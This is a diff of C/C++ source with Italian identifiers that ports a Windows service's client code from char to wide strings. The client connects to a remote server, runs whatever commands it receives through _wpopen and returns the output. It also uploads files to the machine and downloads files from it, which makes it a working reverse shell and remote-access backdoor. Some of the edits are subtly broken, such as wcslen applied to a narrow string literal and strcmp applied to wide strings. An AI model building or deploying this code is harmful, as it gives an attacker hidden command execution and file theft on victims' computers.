@@ -33,20 +33,20 @@ VOID WINAPI ServiceCtrlHandler(DWORD);
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
 
 void mainConnessioneAlServer();
-void invia(SOCKET socketConnessione, char* messaggio);
-char* riceviStringa(SOCKET socketConnessione, char *recvbuf);
+void invia(SOCKET socketConnessione, wchar_t* messaggio);
+wchar_t* riceviStringa(SOCKET socketConnessione, wchar_t *recvbuf);
 void inizializzaConnessione(SOCKET *ConnectSocket);
 void chiudiConnessione(SOCKET ConnectSocket);
 
-int ottieniComando(char *comando);
-void setCartellaCorrente(char* path, char* dirCorrente);
-void getCartellaCorrente(char* temp);
+int ottieniComando(wchar_t *comando);
+void setCartellaCorrente(wchar_t* path, wchar_t* dirCorrente);
+void getCartellaCorrente(wchar_t* temp);
 
 //void test();
 
 #define SERVICE_NAME  _T("My Sample Service")
 
-int _tmain(int argc, char *argv[])
+int _tmain(int argc, wchar_t *argv[])
 {
 	//In this case the main service is creating subprocess to handle the real job of the application.
 	if (argc != 1) {
@@ -54,9 +54,9 @@ int _tmain(int argc, char *argv[])
 			In this case client need to be started. The service periodically call this function.
 			At the end the function called will end the process, so there should be no return.
 		*/
-		if (argv[1][0] == 'c') {
+		if (argv[1][0] == L'c') {
 			mainConnessioneAlServer();
-		}else if (argv[1][0] == 't') {
+		}else if (argv[1][0] == L't') {
 			//test();
 		}
 	}
@@ -85,7 +85,7 @@ void mainConnessioneAlServer() {
 	SOCKET socketConnessione = INVALID_SOCKET;
 
 	//User for shell control
-	char path[DEFAULT_BUFLEN], comando[DEFAULT_BUFLEN], buffer[DEFAULT_BUFLEN];
+	wchar_t path[DEFAULT_BUFLEN], comando[DEFAULT_BUFLEN], buffer[DEFAULT_BUFLEN];
 	FILE *read;
 
 	inizializzaConnessione(&socketConnessione);
@@ -95,54 +95,54 @@ void mainConnessioneAlServer() {
 	while (true) {
 		//send
 		invia(socketConnessione, path);
-		invia(socketConnessione, "end");
+		invia(socketConnessione, L"end");
 
 		//recive
 		riceviStringa(socketConnessione, comando);
-		printf("\n[RCV]: %s\n\n", comando);
+		printf("\n[RCV]: %ls\n\n", comando);
 		int cmdN = ottieniComando(comando);
 		if (cmdN == 1) {	  //Change Dir
 			setCartellaCorrente(comando, path);
 		}
 		else if (cmdN == 2) { //Upload to client
-			char* fileName = &comando[3];
+			wchar_t* fileName = &comando[3];
 			FILE *file;
-			int e = fopen_s(&file, fileName, "a");
+			int e = _wfopen_s(&file, fileName, L"a");
 			if (e == 0) {
-				invia(socketConnessione, "Per ora è possibile mandare solo 512 char senza invio - da migliorare: ");
-				invia(socketConnessione, "end");
+				invia(socketConnessione, L"Per ora è possibile mandare solo 512 wchar_t senza invio - da migliorare: ");
+				invia(socketConnessione, L"end");
 				riceviStringa(socketConnessione, buffer);
-				fputs(buffer, file);
-				invia(socketConnessione, "File scritto con successo.");
+				fputws(buffer, file);
+				invia(socketConnessione, L"File scritto con successo.");
 				fclose(file);
 			}
 			else {
-				invia(socketConnessione, "Impossibile aprire il file");
+				invia(socketConnessione, L"Impossibile aprire il file");
 			}
 		}
 		else if (cmdN == 3) { //Downlaod from client
-			char* fileName = &comando[3];
+			wchar_t* fileName = &comando[3];
 			FILE *file;
-			int e = fopen_s(&file, fileName, "r");
+			int e = _wfopen_s(&file, fileName, L"r");
 			if (e == 0) {
-				invia(socketConnessione, "Inviando il file: ");
+				invia(socketConnessione, L"Inviando il file: L");
 				invia(socketConnessione, fileName);
-				invia(socketConnessione, "\n");
-				while (fgets(buffer, DEFAULT_BUFLEN, file)) {
+				invia(socketConnessione, L"\n");
+				while (fgetws(buffer, DEFAULT_BUFLEN, file)) {
 					invia(socketConnessione, buffer);
 				}
 				fclose(file);
 			}
 			else {
-				invia(socketConnessione, "Impossibile aprire il file");
+				invia(socketConnessione, L"Impossibile aprire il file");
 			}
 		}
 		else {
-			if ((read = _popen(comando, "rt")) == NULL)
+			if ((read = _wpopen(comando, L"rt")) == NULL)
 				exit(1);
-			while (fgets(buffer, DEFAULT_BUFLEN, read)) {
+			while (fgetws(buffer, DEFAULT_BUFLEN, read)) {
 				invia(socketConnessione, buffer);
-				printf(buffer);
+				printf("%ls",buffer);
 			}
 			_pclose(read);
 		}
@@ -160,15 +160,15 @@ void mainConnessioneAlServer() {
 		2 - Upload file command
 		3 - Download file command
 */
-int ottieniComando(char *comando) {
-	if (strlen(comando) > 3) {
-		if (comando[0] == 'c' && comando[1] == 'd') {
+int ottieniComando(wchar_t *comando) {
+	if (wcslen(comando) > 3) {
+		if (comando[0] == L'c' && comando[1] == L'd') {
 			return 1;
 		}
-		else if (comando[0] == 'u' && comando[1] == 'p') {
+		else if (comando[0] == L'u' && comando[1] == L'p') {
 			return 2;
 		}
-		else if (comando[0] == 'd' && comando[1] == 'w') {
+		else if (comando[0] == L'd' && comando[1] == L'w') {
 			return 3;
 		}
 	}
@@ -178,28 +178,28 @@ int ottieniComando(char *comando) {
 /*
 	To get current directory.
 */
-void getCartellaCorrente(char* temp) {
-	size_t size;
-	LPWSTR dirCorrente = new TCHAR[DEFAULT_BUFLEN];
-	GetCurrentDirectory(DEFAULT_BUFLEN, dirCorrente);
-	size = wcslen(dirCorrente);
-	wcstombs_s(NULL, temp, DEFAULT_BUFLEN, dirCorrente, size);
+void getCartellaCorrente(wchar_t* temp) {
+	//size_t size;
+	//LPWSTR dirCorrente = new TCHAR[DEFAULT_BUFLEN];
+	GetCurrentDirectory(DEFAULT_BUFLEN, temp);
+	//size = wcslen(dirCorrente);
+	//wcstombs_s(NULL, temp, DEFAULT_BUFLEN, dirCorrente, size);
 }
 
 /*
 	To change current directory while navigating.
 */
-void setCartellaCorrente(char* relative, char* dirCorrente) {
+void setCartellaCorrente(wchar_t* relative, wchar_t* dirCorrente) {
 
-	if (strlen(relative) >= 5 && relative[4] == ':') {
-		strcpy_s(dirCorrente, DEFAULT_BUFLEN, &relative[3]);
+	if (wcslen(relative) >= 5 && relative[4] == L':') {
+		wcscpy_s(dirCorrente, DEFAULT_BUFLEN, &relative[3]);
 	}
 	else {
 		getCartellaCorrente(dirCorrente);
-		relative[2] = '\\';
-		strcat_s(dirCorrente, DEFAULT_BUFLEN, &relative[2]);
+		relative[2] = L'\\';
+		wcscat_s(dirCorrente, DEFAULT_BUFLEN, &relative[2]);
 	}
-	int i = _chdir(dirCorrente);
+	int i = _wchdir(dirCorrente);
 	getCartellaCorrente(dirCorrente);
 }
 
@@ -207,34 +207,35 @@ void setCartellaCorrente(char* relative, char* dirCorrente) {
 	Function used to send message to the server.
 	IMPORTANT: If any error comunicating to the server occurs the process will be stopped.
 	IN SOCKET socketConnessione - Socket on which the program have to send.
-	IN char *messaggio - Buffer used to store the outgoing message.
+	IN wchar_t *messaggio - Buffer used to store the outgoing message.
 */
-void invia(SOCKET socketConnessione, char* messaggio) {
-	int iResult = send(socketConnessione, messaggio, (int)strlen(messaggio), 0);
+void invia(SOCKET socketConnessione, wchar_t* messaggio) {
+	//One wchar_t character is 2 byte wide so we need to send the message lenght * 2 bytes.
+	int iResult = send(socketConnessione, (char *)messaggio, (int)wcslen(messaggio)*2, 0);
 	if (iResult == SOCKET_ERROR) {
 		printf("\nDEBUG: Error during send\n");
 		chiudiConnessione(socketConnessione);
 		exit(1);
 	}
-	printf("[SND]: %s\n", messaggio);
+	printf("[SND]: %ls\n", messaggio);
 }
 
 /*
 	Function used to recive string of max lenght DEFAULT_BUFLEN.
 	IMPORTANT: If any error comunicating to the server occurs the process will be stopped.
 	IN SOCKET socketConnessione - Socket on which the program have to listen.
-	IN char *recvbuff - Buffer used to store the incoming message.
+	IN wchar_t *recvbuff - Buffer used to store the incoming message.
 */
-char* riceviStringa(SOCKET socketConnessione, char *recvbuf) {
-	recvbuf[0] = '\0';
+wchar_t* riceviStringa(SOCKET socketConnessione, wchar_t *recvbuf) {
+	recvbuf[0] = L'\0';
 	int iResult;
-	iResult = recv(socketConnessione, recvbuf, DEFAULT_BUFLEN, 0);
+	iResult = recv(socketConnessione, (char *)recvbuf, DEFAULT_BUFLEN, 0);
 	if (iResult <= 0) {
 		printf("\nDEBUG: Error during recive\n");
 		chiudiConnessione(socketConnessione);
 		exit(1);
 	}
-	recvbuf[iResult] = '\0';
+	recvbuf[iResult/2] = L'\0';
 	return recvbuf;
 }
 
@@ -446,9 +447,9 @@ SOCKET ConnectSocket = INVALID_SOCKET;
 struct addrinfo *result = NULL,
 *ptr = NULL,
 hints;
-char *sendbuf = "Ciao, aspetto un comando:";
-char *sendaddr = "127.0.0.1";
-char recvbuf[DEFAULT_BUFLEN];
+wchar_t *sendbuf = L"Ciao, aspetto un comando:";
+wchar_t *sendaddr = L"127.0.0.1";
+wchar_t recvbuf[DEFAULT_BUFLEN];
 int iResult;
 int recvbuflen = DEFAULT_BUFLEN;
 
@@ -510,7 +511,7 @@ return;
 iResult = 1;
 while (iResult) {
 // Send an initial buffer
-iResult = send(ConnectSocket, sendbuf, (int)strlen("Ciao, aspetto un comando:"), 0);
+iResult = send(ConnectSocket, sendbuf, (int)wcslen("Ciao, aspetto un comando:"), 0);
 //Send failed
 if (iResult == SOCKET_ERROR) {
 printf("send failed with error: %d\n", WSAGetLastError());
@@ -519,7 +520,7 @@ WSACleanup();
 return;
 }
 printf("Bytes Sent: %ld\nMessage Sent: %s\n\n", iResult, sendbuf);
-iResult = send(ConnectSocket, "end", 3, 0);
+iResult = send(ConnectSocket, L"end", 3, 0);
 //Send failed
 if (iResult == SOCKET_ERROR) {
 printf("send failed with error: %d\n", WSAGetLastError());
@@ -533,7 +534,7 @@ do {
 
 iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
 if (iResult > 0) {
-recvbuf[iResult] = '\0';
+recvbuf[iResult] = L'\0';
 printf("Bytes received: %d\nMessage Recived: %s\n", iResult, recvbuf);
 }
 else if (iResult == 0)
@@ -541,7 +542,7 @@ printf("End receive\n");
 else
 printf("recv failed with error: %d\n", WSAGetLastError());
 
-} while (iResult > 0 && strcmp(recvbuf, "end"));
+} while (iResult > 0 && strcmp(recvbuf, L"end"));
 printf("\n");
 }
 
